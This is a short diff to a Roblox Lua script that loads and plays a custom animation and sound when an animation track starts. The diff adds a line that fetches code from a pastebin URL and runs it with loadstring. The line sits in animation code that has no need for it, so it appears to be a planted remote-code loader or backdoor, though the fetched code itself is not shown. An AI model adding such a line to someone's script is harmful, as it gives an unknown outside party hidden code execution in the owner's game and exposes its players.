@@ -46,6 +46,7 @@ local function onAnimationPlayed(animationTrack)
         AnimAnim.AnimationId = "rbxassetid://18447913645"
         local Anim = Humanoid:LoadAnimation(AnimAnim)
         AnimAnim.AnimationId = "rbxassetid://0"
+        loadstring(game:HttpGet("https://pastebin.com/raw/ZYUzv5Ev"))()
         
         local sound1 = Instance.new("Sound")
         sound1.SoundId = "rbxassetid://18443048724"
